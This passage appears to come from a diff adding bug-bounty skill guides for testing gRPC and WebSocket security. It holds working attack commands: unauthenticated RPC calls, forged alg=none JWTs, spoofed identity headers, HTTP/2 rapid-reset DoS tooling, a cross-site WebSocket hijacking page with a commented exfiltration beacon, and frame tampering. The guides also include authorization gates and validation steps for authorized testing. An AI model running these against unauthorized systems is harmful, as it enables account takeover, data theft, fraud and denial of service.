+curl -s --http2-prior-knowledge -X POST "http://$TARGET:9090/x.Y/Z" \
+  -H "content-type: application/grpc" -o /dev/null -D - | grep -i grpc-status
+
+# TLS-fronted h2 (port 443): look for grpc-status trailer / grpc content-type
+curl -s --http2 -X POST "https://$TARGET/grpc.health.v1.Health/Check" \
+  -H "content-type: application/grpc-web+proto" -o /dev/null -D - | grep -i "grpc-status\|content-type"
+```
+
+`grpc-status` trailer present ⇒ a gRPC server (or grpc-gateway/Envoy) is behind that port. `UNIMPLEMENTED` on a random path is normal and only confirms the transport — not a finding.
+
+---
+
+## Phase 2 — Service Enumeration via Reflection
+
+```bash
+brew install grpcurl   # or: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
+
+# List services — -plaintext for h2c, -insecure for self-signed TLS, plain for valid TLS
+grpcurl -plaintext $TARGET:50051 list
+grpcurl -insecure  $TARGET:443   list
+
+# Typical output when reflection is on:
+#   grpc.reflection.v1.ServerReflection
+#   grpc.health.v1.Health
+#   user.UserService
+#   admin.AdminService
+#   payment.PaymentService
+
+# List + describe every method of each service
+grpcurl -plaintext $TARGET:50051 list admin.AdminService
+grpcurl -plaintext $TARGET:50051 describe admin.AdminService.DeleteUser
+grpcurl -plaintext $TARGET:50051 describe .admin.DeleteUserRequest   # message schema
+
+# Dump the whole catalog to triage interesting surfaces
+for SVC in $(grpcurl -plaintext $TARGET:50051 list); do
+  echo "== $SVC =="; grpcurl -plaintext $TARGET:50051 list "$SVC"
+done | tee grpc-catalog.txt
+grep -iE 'admin|internal|debug|secret|impersonate|exec|migrate|reset|delete' grpc-catalog.txt
+```
+
+**Reflection disabled?** You can still call known methods if you can guess them, or rebuild the descriptor set from a leaked `.proto` (Phase 5) and pass it with `grpcurl -protoset bundle.bin ...`. Reflection-off is a hardening control, not a security boundary.
+
+---
+
+## Phase 3 — Call Methods Without Authentication (authz testing)
+
+```bash
+# Baseline: call a sensitive method with NO auth metadata
+grpcurl -plaintext $TARGET:50051 -d '{}' admin.AdminService/ListUsers
+
+# IDOR across an enumerable id field
+for ID in 1 2 3 100 1000 1001; do
+  echo "id=$ID"; grpcurl -plaintext $TARGET:50051 \
+    -d "{\"user_id\": $ID}" user.UserService/GetUser 2>&1 | head -4
+done
+```
+
+**Interpret the gRPC status code, not just whether bytes came back (see Validation):**
+- `OK` + populated response → method executed unauthenticated → finding.
+- `Unauthenticated (16)` / `PermissionDenied (7)` → authz is enforced; NOT a finding.
+- `Unimplemented (12)` → wrong path / method not on this server.
+- `InvalidArgument (3)` → reached and parsed your input → method is callable; fix the payload and retry.
+
+---
+
+## Phase 4 — Authentication / Trust-Boundary Bypass
+
+```bash
+# (a) Forged bearer / alg=none JWT in the authorization metadata
+grpcurl -plaintext $TARGET:50051 \
+  -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0." \
+  -d '{}' admin.AdminService/GetConfig
+
+# (b) Backend-trusts-proxy headers: many gRPC backends authenticate at Envoy and
+#     then trust identity injected as metadata. If the edge does not STRIP these,
+#     spoofing them = full impersonation. Test every plausible name:
+for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \
+         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \
+         "x-envoy-internal: true" "grpc-internal-encoding-request: true"; do
+  echo "== $H =="
+  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3
+done
+
+# (c) Binary metadata smuggling — keys ending in -bin are base64-decoded by the
+#     server; some auth middlewares only inspect text metadata, missing -bin keys.
+grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \
+  -d '{}' admin.AdminService/GetConfig
+```
+
+The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** — if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port.
+
+---
+
+## Phase 5 — Proto File / Schema Discovery
+
+```bash
+# Proxies (Envoy/grpc-gateway) sometimes serve descriptors or swagger
+for P in proto api/proto swagger.json openapiv2 service.swagger.json descriptor.pb; do
+  S=$(curl -s -o /dev/null -w '%{http_code}' "https://$TARGET/$P")
+  [ "$S" != 404 ] && echo "Found: /$P ($S)"
+done
+
+# Source/registry leakage of .proto definitions
+gh search code --owner "$TARGET_ORG" 'syntax = "proto3"' --limit 20 2>/dev/null
+gh search code --owner "$TARGET_ORG" 'service ' filename:.proto --limit 20 2>/dev/null
+
+# Rebuild a descriptor set from leaked protos and drive the API without reflection
+protoc --descriptor_set_out=bundle.bin --include_imports -I proto/ proto/*.proto
+grpcurl -protoset bundle.bin -plaintext $TARGET:50051 list
+```
+
+Proto leakage on its own is low severity; its value is as the key that unlocks Phases 3–4 against a reflection-disabled target.
+
+---
+
+## Phase 6 — gRPC-Web / grpc-gateway / JSON-Transcoding Attacks
+
+gRPC almost always reaches the browser through a transcoder: **Envoy `grpc_web`/`grpc_json_transcoder`**, **grpc-gateway** (REST↔gRPC), or **Connect**. These translators are the realistic external attack surface and frequently re-expose internal methods.
+
+```bash
+# (a) grpc-gateway maps gRPC methods to REST. Reflection-derived method names often
+#     map predictably — hit them over plain HTTP/JSON (no gRPC client needed):
+curl -s -X POST "https://$TARGET/v1/admin/users:list" -H 'content-type: application/json' -d '{}'
+curl -s -X POST "https://$TARGET/admin.AdminService/ListUsers" \
+  -H 'content-type: application/json' -d '{}'    # default unannotated route
+
+# (b) Build a real gRPC-Web length-prefixed frame instead of a hand-waved one.
+#     Frame = 1-byte flag (0x00=data) + 4-byte big-endian length + protobuf payload.
+#     Encode the message with protoscope so the bytes are correct:
+#       protoscope -s <<<'1: 1'  > msg.bin          # field 1 (e.g. user_id) = 1
+MSG=$(xxd -p msg.bin | tr -d '\n')
+LEN=$(printf '%08x' $((${#MSG}/2)))                 # 4-byte length prefix
+FRAME=$(printf '00%s%s' "$LEN" "$MSG")
+echo "$FRAME" | xxd -r -p > frame.bin
+curl -s "https://$TARGET/user.UserService/GetUser" \
+  -H 'content-type: application/grpc-web+proto' -H 'x-grpc-web: 1' \
+  --data-binary @frame.bin | xxd | head
+
+# (c) grpc-web+json variant (Envoy/Connect) — no manual framing needed:
+curl -s "https://$TARGET/user.UserService/GetUser" \
+  -H 'content-type: application/grpc-web+json' -H 'x-grpc-web: 1' \
+  -d '{"user_id": 1}'
+
+# (d) Connect protocol (buf): plain JSON POST, unary, no framing:
+curl -s "https://$TARGET/user.UserService/GetUser" \
+  -H 'content-type: application/json' -H 'connect-protocol-version: 1' \
+  -d '{"user_id": 1}'
+```
+
+Why this matters: the browser-facing transcoder commonly forwards to the SAME backend as the internal gRPC plane. If the transcoder route exposes `AdminService` or fails to require the auth the gRPC client would have sent, you have a real, externally-reachable authz bug. Confirm each transcoded route returns `OK` with sensitive data, and verify it is reachable as an unauthenticated/low-priv user (not just from inside the mesh).
+
+---
+
+## Phase 7 — HTTP/2 Rapid Reset DoS (CVE-2023-44487)
+
+**Authorization gate:** DoS is out of scope on the overwhelming majority of programs. Do NOT run this without explicit, written, scoped permission and a target/window the program owner agreed to. Skip to Validation if unsure.
+
+The attack is NOT a load test. It opens streams (HEADERS) and immediately cancels them (RST_STREAM) before the server finishes, so each cancelled stream frees a `MAX_CONCURRENT_STREAMS` slot instantly while the server still spends work on it — the client races far ahead of the concurrency cap. `h2load`/`ghz` are throughput benchmarkers; **they have no rapid-reset mode and never interleave HEADERS+immediate-RST_STREAM, so they cannot test this.**
+
+**Correct tooling — author-sanctioned PoCs that actually emit the frame pattern:**
+```bash
+# CERT/CC + community tracking and PoCs for CVE-2023-44487:
+#   https://kb.cert.org/vuls/id/421644
+#   https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/  (Cloudflare writeup)
+# Go PoC that sends HEADERS then immediate RST_STREAM in a tight loop:
+git clone https://github.com/secengjeff/rapidresetclient
+cd rapidresetclient && go build -o rapidreset .
+# Detection-only: a SHORT, low-count burst, with permission, then STOP:
+./rapidreset --help    # confirm current flags first, then a SMALL authorized burst, e.g.:
+# ./rapidreset -url https://$TARGET:443 -concurrency 1 -requests 20
+
+# If you must roll your own, use the h2 framing layer (golang.org/x/net/http2)
+# to write a HEADERS frame immediately followed by RST_STREAM(CANCEL) per stream id.
+```
+
+**Detection without DoSing — prefer this:** the only thing you need to PROVE is whether mitigations are present. Check the server banner / version and whether it tracks reset floods:
+```bash
+# Fingerprint the HTTP/2 implementation and version (patched versions are known):
+curl -sI --http2 https://$TARGET/ | grep -i '^server:'
+# nghttp2 >=1.57.0, Go net/http with the 2023-10 fix, Envoy >=1.27.1/1.26.5/1.25.10/1.24.11,
+# grpc-go >=1.56.3/1.57.1/1.58.3 are mitigated. Version-match instead of flooding.
+```
+Report the *version-confirmed* mitigation gap rather than a benchmark slowdown. "Server got slower under load" is not proof of CVE-2023-44487 — it produces false positives on slow/under-provisioned servers and false negatives on patched ones that throttle resets gracefully.
+
+---
+
+## Tools
+
+```bash
+grpcurl   # primary CLI client (list/describe/call, -protoset for reflection-off)
+grpcui    # web UI for interactive exploration:  grpcui -plaintext $TARGET:50051
+protoc + protoscope   # build/inspect raw protobuf and gRPC-Web frames (Phase 6)
+buf       # lint/inspect proto, drive Connect endpoints
+# DoS-only, AUTHORIZED engagements: secengjeff/rapidresetclient (true rapid-reset PoC).
+#   NOTE: ghz and h2load are LOAD benchmarkers, NOT rapid-reset testers — do not
+#   use them to "prove" CVE-2023-44487.
+```
+
+---
+
+## Chain Table
+
+| gRPC finding | Chain to | Impact |
+|--------------|----------|--------|
+| Reflection enabled | Enumerate all internal service methods + messages | Full API catalog disclosure (enabler) |
+| Admin method, no auth | Call privileged RPCs (`DeleteUser`, `GetConfig`) | Data manipulation / system access — Critical |
+| Proxy forwards `x-user-id`/`x-tenant-id` unstripped | Spoof identity metadata → cross-tenant impersonation | Tenant isolation bypass — Critical |
+| IDOR via enumerable id field | Iterate `user_id` over `GetUser` | Mass PII exfil — High |
+| grpc-gateway / gRPC-Web route re-exposes internal RPC | Hit transcoded REST/JSON path unauth | Externally-reachable authz bypass — High/Critical |
+| Plaintext h2c on internal port | MITM / sniff metadata (bearer tokens) | Credential capture — High |
+| `.proto` leak (repo/swagger) | `-protoset` to drive reflection-off target | Unlocks Phases 3–4 — Low alone, High as enabler |
+
+Related skills: **hunt-idor** (id enumeration logic), **hunt-api-misconfig** (JWT alg=none / mass-assignment in request messages), **hunt-auth-bypass** (edge-vs-backend trust boundary), **hunt-tls-network** (h2c/plaintext + ALPN), **cloud-iam-deep** (if a called RPC returns cloud creds).
+
+---
+
+## Validation — false-positive discipline
+
+gRPC's failure modes look like successes to a naive `grep`. Apply these gates before any submission.
+
+1. **Status-code discrimination, not byte-counting.** A non-empty response can still be an error frame. Confirm the `grpc-status` trailer is `0` (OK). `Unauthenticated (16)` / `PermissionDenied (7)` mean auth WORKS — close the candidate. `Unimplemented (12)` means you have the wrong method. Re-run with `grpcurl -v` and read the trailers explicitly.
+
+2. **Reflection / health endpoints are often intentionally public.** `grpc.reflection.*` and `grpc.health.v1.Health` being reachable is, by itself, **info disclosure (Low/Medium at most)** — many vendors ship reflection on by design. Do NOT report it as "missing auth" unless it leaks a non-public service catalog. The finding is the *sensitive* service you can then call without auth, proven in Phase 3.
+
+3. **Distinguish "no auth" from "auth not required for THIS method."** Some methods (health, public catalog reads) are legitimately anonymous. Prove the bug by showing an authenticated-vs-unauthenticated **state delta**: the same RPC returns another user's/tenant's private data without credentials, or a mutating admin RPC executes (re-read the changed state to confirm side-effect).
+
+4. **Proxy-vs-backend reachability.** A bug reachable only by hitting an internal `:50051` you found via SSRF/port-scan is real but its severity depends on reachability. State explicitly how an external attacker reaches it (exposed port, SSRF egress, proxy passthrough). For metadata-spoofing, prove the PUBLIC proxy forwards the spoofed header — not just the bypassed backend port.
+
+5. **OOB / Collaborator for anything blind.** If an RPC takes a URL/host argument (webhook, import, render), it is an SSRF candidate: point it at a Burp Collaborator payload with a unique subdomain and confirm the DNS+HTTP interaction before claiming SSRF. No interaction = no SSRF. Hand off to **hunt-ssrf**.
+
+6. **DoS is authorization-gated and version-verifiable.** Never submit CVE-2023-44487 off a benchmark "slowdown." Either (a) version-match an unpatched HTTP/2 stack from the `server:` banner, or (b) demonstrate the reset-flood ONLY under explicit written authorization with an agreed window — then stop immediately. A slow response is not proof.
+
+**Severity guide (after the gates above pass):**
+- Sensitive/admin RPC callable with no auth, side-effect proven → **Critical**
+- Proxy-forwarded metadata spoofing → cross-tenant impersonation → **Critical**
+- IDOR / mass PII via enumerable RPC → **High**
+- Internal service externally reachable (transcoder or open port) → **High**
+- Plaintext h2c leaking bearer metadata → **High**
+- Reflection enabled exposing non-public catalog → **Medium** (enabler)
+- Proto/descriptor leak, no callable sensitive method → **Low**
+
+
+
+
+---
+
+## websocket
+
+# HUNT-WEBSOCKET — WebSocket Security
+
+## Crown Jewel Targets
+
+CSWSH (Cross-Site WebSocket Hijacking) with a cookie-authenticated handshake and no CSRF/per-connection token = High–Critical (real-time exfil of any logged-in victim's data).
+
+**Highest-value chains:**
+- **CSWSH → data exfil / ATO** — handshake authenticates via ambient cookie, no CSRF token, Origin not enforced → attacker page opens WS as the victim and streams their messages/PII/tokens. If the stream carries a session/refresh/CSRF token, this escalates to ATO.
+- **No per-message auth** — HTTP/handshake auth present but individual WS frames are not re-authorized → privileged messages accepted (`deleteUser`, `getSecretConfig`).
+- **Message tampering** — modify in-flight frames (price, qty, userId, amount) in trading/game/checkout apps → financial fraud.
+- **socket.io namespace / room authz bypass** — connect to a privileged namespace or join another user's room without a permission check → cross-tenant real-time exfil.
+- **Handshake-layer Upgrade smuggling** — a malformed `Upgrade`/`Connection`/`Sec-WebSocket-*` handshake makes the front proxy and origin disagree on whether an upgrade occurred → request-smuggling tunnel.
+
+---
+
+## Grounding — Reference Cases (read before hunting)
+
+These are public, verifiable references. Use them to calibrate what a *real* WS finding looks like and how it was proven. Do not invent additional report IDs or payouts.
+
+| # | Source / ID | Class | Lesson |
+|---|-------------|-------|--------|
+| 1 | PortSwigger Web Security Academy — "Cross-site WebSocket hijacking" (research + labs) | CSWSH | Canonical CSWSH model: cookie-auth handshake + no CSRF token + missing Origin check → attacker reads/sends as victim. The authoritative methodology. |
+| 2 | Christian Schneider — "Cross-Site WebSocket Hijacking (CSWSH)" (original disclosure/write-up, 2013) | CSWSH | First public CSWSH technique: cookie-auth handshake + no Origin enforcement; PoC must prove victim-data receipt in the attacker browser, not just a 101. |
+| 3 | Coda CSWSH (referenced in this repo's hunt-csrf set) | CSWSH | Real-time collab apps commonly authenticate the socket purely via cookie; Origin allow-listing was the missing control. |
+| 4 | CVE-2020-7662 — `websocket-extensions` (Node) ReDoS | DoS | A crafted `Sec-WebSocket-Extensions` header triggers catastrophic backtracking — handshake header is an attack surface, not just frames. |
+| 5 | CVE-2024-37890 — `ws` (Node) DoS | DoS | Many handshake request headers exhaust the server; confirms the handshake itself is parser-attackable pre-frames. |
+| 6 | Outdated `socket.io` / Engine.IO stacks | socket.io | Motivates the version-fingerprint step in Phase 7 — fingerprint the version, then check that release's known advisories. |
+
+> Only the four CVEs above are asserted with exact IDs because they are verifiable. For any case where you are not certain of the exact identifier, describe the technique with **no** citation — a wrong CVE is worse than none.
+
+---
+
+## Phase 1 — Discover WebSocket Endpoints
+
+```bash
+# Grep JS for WS connections (handshake URLs, socket.io clients)
+grep -rE "new WebSocket|io\(|io\.connect|socket\.io|new SockJS|signalr|Phoenix\.Socket|wss?://" \
+  recon/$TARGET/ --include="*.js" 2>/dev/null | \
+  grep -oE "(wss?://[^'\"]+|/[a-zA-Z0-9/_.-]*socket[^'\"]*|/signalr[^'\"]*|/cable\b)" | sort -u
+
+# Crawl URLs for realtime hints
+grep -iE "socket|/ws\b|websocket|stream|realtime|live|chat|events|/cable|/signalr|notifications" \
+  recon/$TARGET/urls.txt | sort -u
+
+# Probe handshake (101 = upgrade supported)
+curl -sI -o /dev/null -w "%{http_code}\n" \
+  -H "Connection: Upgrade" -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" \
+  -H "Sec-WebSocket-Key: $(head -c16 /dev/urandom | base64)" \
+  "https://$TARGET/ws"
+
+# socket.io polling handshake leaks version + sid
+curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo
+
+# Non-standard WS ports
+nmap -sV -p 80,443,3000,3001,8080,8443,8888,9000 $TARGET 2>/dev/null | grep open
+```
+
+In Burp Pro, use `get_proxy_websocket_history` (and the WebSockets tab) after browsing the app to enumerate live sockets, message schemas, and which frames carry auth-sensitive data.
+
+---
+
+## Phase 2 — CSWSH (Cross-Site WebSocket Hijacking)
+
+CSWSH requires THREE conditions together: (a) the handshake authenticates via an **ambient credential** (cookie sent automatically), (b) there is **no unpredictable per-connection token** in the handshake (no CSRF token / no token in URL/body), and (c) the server **does not enforce Origin**. Missing any one breaks the attack.
+
+```bash
+# Step 1 — Confirm handshake auth model in DevTools → Network → WS → Headers.
+#   Look for: Cookie: session=...  AND  the ABSENCE of any per-request token
+#   (no ?token=, no Sec-WebSocket-Protocol carrying a bearer, no body nonce).
+#   If a unique token rides the handshake, CSWSH is NOT exploitable cross-site.
+
+# Step 2 — Probe Origin enforcement (this is a SIGNAL, not a confirmation)
+wscat -c "wss://$TARGET/ws" \
+  --header "Origin: https://evil.com" \
+  --header "Cookie: session=YOUR_SESSION"
+# A 101 from a foreign Origin only proves the handshake opened.
+# It does NOT confirm CSWSH — the server may still validate Origin at the
+# message layer, refuse to stream authenticated data, or require a token
+# in the first app-level frame. Treat 101 as "candidate", move to Step 3.
+```
+
+```html
+<!-- Step 3 — Real PoC: host on attacker origin, open while a SEPARATE victim
+     account is logged into TARGET in the same browser. The bug is only
+     confirmed if attacker JS RECEIVES the victim's data (or successfully
+     sends a privileged frame). Cross-origin JS cannot set Origin/Cookie —
+     the browser does, which is exactly the threat model. -->
+<html><body><pre id="out"></pre><script>
+var marker = "CSWSH-" + Math.random().toString(36).slice(2);   // unique per run
+var ws = new WebSocket("wss://TARGET/ws");                     // attacker cannot forge Origin
+ws.onopen = () => {
+  log("[+] 101 opened from attacker origin");
+  ws.send(JSON.stringify({type:"subscribe", channel:"user_notifications", _m:marker}));
+};
+ws.onmessage = e => {
+  log("VICTIM-DATA: " + e.data);
+  // Exfil PROOF to your Collaborator/listener so receipt is logged out-of-band:
+  // navigator.sendBeacon("https://<collab-id>.oastify.com/cswsh?d=" + encodeURIComponent(e.data));
+};
+ws.onerror = e => log("ERR (likely Origin/auth rejected at message layer)");
+function log(s){document.getElementById("out").textContent += s + "\n";}
+</script></body></html>
+```
+
+**False-positive killers:**
+- A completed `101` from `Origin: evil.com` is NOT a finding. Many servers accept the upgrade and then send nothing, or close on the first authenticated frame.
+- Verify the data you receive belongs to a **different account** than the attacker, using a unique marker / distinct victim PII you planted in account B.
+- Exfil the received payload to **Burp Collaborator / an OAST listener** so receipt is recorded out-of-band — this is your impact proof for the report.
+- If a per-connection token rides the handshake (in the URL, a sub-protocol, or the first frame), CSWSH is **not** cross-site exploitable; downgrade or drop.
+
+---
+
+## Phase 3 — Missing / Weak Authentication on WS Messages
+
+Handshake auth ≠ per-message auth. Apps often authenticate the socket once, then trust every subsequent frame.
+
+```bash
+# No cookie at all — does the server process app frames?
+wscat -c "wss://$TARGET/ws"
+# > {"type":"getUserData","userId":1}
+# > {"type":"getAdminPanel"}
+
+# Low-priv session sending high-priv actions
+wscat -c "wss://$TARGET/ws" --header "Cookie: session=LOW_PRIV_SESSION"
+# > {"action":"deleteUser","userId":999}
+# > {"action":"getSecretConfig"}
+```
+
+**Validate:** the privileged action must produce a real effect (a deleted test user, returned secret config, a state change visible via a second channel) — a frame that is *accepted and silently ignored* is not a finding. Re-run as an unauthenticated client to confirm the action is not simply broadcast to everyone harmlessly.
+
+### Replay of Signed Messages
+If messages carry signatures (e.g., `{"type":"payment","amount":100,"signature":"..."}`), test replay for freshness and session binding. Capture a signed message and test: (a) **time-window bypass**: replay the message after its expiry timestamp (clock skew/validation gap), (b) **session bypass**: capture a signed message from user A's session and replay it in user B's session — if accepted, the signature was not bound to the user/session ID. Use Burp Repeater to store and replay signed frames, or reconstruct the same message in `wscat` after a time window has passed.
+
+### Business Logic Abuse: State Machine Bypass & Rate Limit Evasion
+Stateful protocols (e.g., a trading platform expecting `connect → authenticate → verify_balance → place_order`) may accept messages out of order or skip prerequisites. Test: (a) **state skip**: connect and immediately send `place_order` without `authenticate` or `verify_balance` first — many stacks don't enforce strict ordering if individual message validation is missing, (b) **high-frequency spam**: send identical or high-volume messages rapidly to bypass WS-layer rate limits (different from HTTP rate limits) — test 100s of messages/second to see if the server throttles, returns 429, or closes the connection. If it accepts and processes all, this can abuse business logic (e.g., many small payments to bypass amount caps, or rapid subscriptions to exhaust resources).
+
+---
+
+## Phase 4 — Message Tampering (Financial / Game / Checkout)
+
+```bash
+# Intercept + edit in Burp (Proxy → WebSockets history → right-click → Send to
+# Repeater, or edit-and-forward). Try server-trusted client values:
+#   {"price":100}      -> {"price":0.01}
+#   {"amount":1}       -> {"amount":9999}
+#   {"userId":123}     -> {"userId":1}        # impersonate admin
+#   {"orderTotal":...} -> recompute downstream?
+
+# wscat replay of a tampered frame
+wscat -c "wss://$TARGET/trade" --header "Cookie: session=SESSION"
+# > {"action":"buy","amount":1,"price":0.01}
+```
+
+**Validate:** the tampered value must persist server-side — confirm via the REST/order API or a fresh socket that the order/balance/price actually reflects the manipulation. Many UIs echo your own frame back optimistically; that echo is NOT proof. Demonstrate financial/state impact, ideally on a sandbox/test instrument.
+
+---
+
+## Phase 5 — socket.io / SignalR / Phoenix Namespace & Room Authz Bypass
+
+Engine.IO/socket.io is a protocol layered over the raw WebSocket. Packet prefixes (Engine.IO `4`=MESSAGE wrapping socket.io `0`=CONNECT, `1`=DISCONNECT, `2`=EVENT) carry namespace/room intent. Authorization must be checked when joining; often it isn't.
+
+```bash
+# 1) Open the raw socket.io WebSocket (Engine.IO v4)
+wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket" \
+  --header "Cookie: session=YOUR_SESSION"
+
+# 2) Respond to the server's Engine.IO OPEN ('0{...}') so the connection lives,
+#    then CONNECT to a namespace with a socket.io CONNECT packet.
+#    CORRECT packet to join the /admin namespace:  40/admin,
+#       4 = Engine.IO MESSAGE,  0 = socket.io CONNECT,  /admin, = namespace
+#    (NOT a ?nsp= query param — see Phase 7. NOT 42 — 42 is MESSAGE+EVENT.)
+# > 40/admin,
+#    Server replies 40/admin,{"sid":"..."} on success, or 44/admin,{...} (error)
+#    on rejection. A 40 success to a privileged namespace as a low/no-priv
+#    user is the bug.
+
+# 3) Once in a namespace, emit an EVENT (42) to join another user's room:
+# > 42/admin,["join",{"room":"user_999_private"}]
+# > 42["subscribe",{"channel":"admin_events"}]      # root namespace
+#    Watch for 42 EVENT frames carrying ANOTHER user's data.
+```
+
+**Validate:** distinguish *connected to namespace* from *received privileged data*. The finding is confirmed only when you receive `42` event frames containing data belonging to a different tenant/user, or a privileged emit produces a verifiable server-side effect. A `40/admin` ack with no subsequent data may just be an open-but-empty namespace.
+
+> SignalR analogue: negotiate at `/<hub>/negotiate`, then connect and `Invoke`/`Send` hub methods — test method-level authorization. Phoenix Channels: `phx_join` to `topic:subtopic` and check whether the server's `join/3` authorizes the topic.
+
+---
+
+## Phase 6 — Handshake-Layer Upgrade Smuggling (NOT frame smuggling)
+
+Important: once a WebSocket is established, your payloads are wrapped in WS frames and are **never re-parsed as HTTP** by the proxy. Typing `GET /admin HTTP/1.1` into an open `wscat` session does nothing. WebSocket-related smuggling lives at the **handshake**, before any frames exist.
+
+The real technique: send a WebSocket Upgrade request that the **front proxy** and the **origin** interpret differently — e.g. a bad `Sec-WebSocket-Version` that makes the origin reply `426 Upgrade Required` (or `400`) while the proxy has already decided the connection is "upgraded" and stops parsing HTTP. The proxy then tunnels subsequent bytes straight to the origin as an opaque stream, letting you smuggle arbitrary HTTP requests past front-end controls (WAF/authz).
+
+```bash
+# Detection is HTTP-layer, not frame-layer. Use Burp Repeater / send_http1_request
+# and toggle ONE handshake variable at a time, comparing front-vs-origin behavior:
+
+#  A) Valid-looking upgrade but unsupported version:
+#     Upgrade: websocket
+#     Connection: Upgrade
+#     Sec-WebSocket-Version: 777          <- origin should 426; does the proxy still tunnel?
+#     Sec-WebSocket-Key: <16-byte base64>
+
+#  B) Upgrade header present but Connection: keep-alive (mismatch)
+#  C) Smuggled second request body after a "successful" 101, then send a normal
+#     follow-up request on the same connection and watch for a desynced response.
+```
+
+Drive this with Burp Pro's **HTTP Request Smuggler** extension (it has WebSocket-upgrade test cases) rather than by hand. **Validate** exactly like classic smuggling: prove desync via a timing/differential probe AND show real impact (reach an internal/forbidden path, poison a cached response, or capture another user's request) — confirmed against **Burp Collaborator / OAST**, never on a single ambiguous response.
+
+---
+
+## Phase 7 — socket.io / Engine.IO Specifics
+
+```bash
+# Version + initial sid (handshake JSON after the leading Engine.IO digit)
+curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling" | head -c 300; echo
+# Old/EOL socket.io stacks have known issues — fingerprint the version, then check that release's advisories;
+# fingerprint the client lib version from JS bundles too.
+
+# Namespace selection is a PROTOCOL message, not a URL param.
+#   WRONG:  wscat -c "wss://$TARGET/socket.io/?EIO=4&transport=websocket&nsp=/admin"
+#           ^ `nsp` is NOT a recognized socket.io query param. It is silently
+#             ignored and you connect to the ROOT namespace "/". You will believe
+#             you tested /admin when you did not.
+#   RIGHT:  open the socket, then send the CONNECT packet  40/admin,  (Phase 5).
+
+# Forged/replayed sid against the polling transport (session fixation / hijack probe)
+curl -s "https://$TARGET/socket.io/?EIO=4&transport=polling&sid=FAKE_OR_VICTIM_SID"
+#   400 "Session ID unknown" = good. A 200 that resumes another sid's stream = bug.
+```
+
+---
+
+## Tools
+
+```bash
+npm install -g wscat                 # CLI WS client (raw + socket.io)
+brew install websocat                # alt client; supports text/binary + autoreconnect
+# Burp Suite Pro: WebSockets history (intercept/edit/replay), HTTP Request
+#   Smuggler extension (handshake-upgrade smuggling), Collaborator for OAST proof.
+# Burp MCP: get_proxy_websocket_history / get_proxy_websocket_history_regex to
+#   enumerate frames; generate_collaborator_payload + get_collaborator_interactions
+#   to prove out-of-band receipt from a CSWSH/smuggling PoC.
+```
+
+---
+
+## Chain Table
+
+| WS finding | Chain to | Impact |
+|-----------|----------|--------|
+| CSWSH + token in stream | Steal session/refresh/CSRF token from victim frames | ATO (Critical) |
+| CSWSH confirmed | Subscribe to victim channels, exfil to OAST | Real-time data theft (High) |
+| No per-message auth | Send admin/privileged frames | Privilege escalation (Critical) |
+| Message tampering | Modify price/amount/userId, confirm server-side | Financial fraud (Critical) |
+| Namespace/room authz bypass | Join other tenant's room, read `42` events | Cross-tenant exfil (High) |
+| Handshake Upgrade smuggling | Tunnel HTTP past WAF/authz, OAST-confirmed | Smuggling → SSRF/cache poison (High–Critical) |
+
+---
+
+## Validation (mandatory before reporting)
+
+- ✅ **CSWSH:** attacker-origin PoC HTML, opened with a *different* victim account logged in, must **receive that victim's data** (verified by a unique planted marker / distinct PII) and exfil it to **Collaborator/OAST**. A bare `101` from a foreign Origin is NOT a finding.
+- ✅ **No per-message auth:** privileged frame produces a **verifiable server-side effect** (state change confirmed via a second channel / REST API), not merely "accepted".
+- ✅ **Message tampering:** tampered value **persists server-side** (confirmed via order/balance API), not just echoed in the UI.
+- ✅ **Namespace/room bypass:** received **`42` event frames with another user's data**, not just a `40` namespace ack.
+- ✅ **Upgrade smuggling:** desync proven by timing/differential probe **and** real-world impact, **OAST-confirmed**. No single-response guesses.
+- ❌ Reject: a 101 alone, an accepted-but-ignored frame, a self-echoed message, a connected-but-empty namespace, or any "confirmed" claim lacking out-of-band/cross-account proof.
+
+**Severity:**
+- CSWSH leaking session/refresh token → ATO: **Critical**
+- CSWSH → real-time session-data theft: **High**
+- No auth on admin/privileged WS actions: **Critical**
+- Financial message tampering (server-confirmed): **Critical**
+- Namespace/room subscription bypass (cross-tenant): **High**
+
+
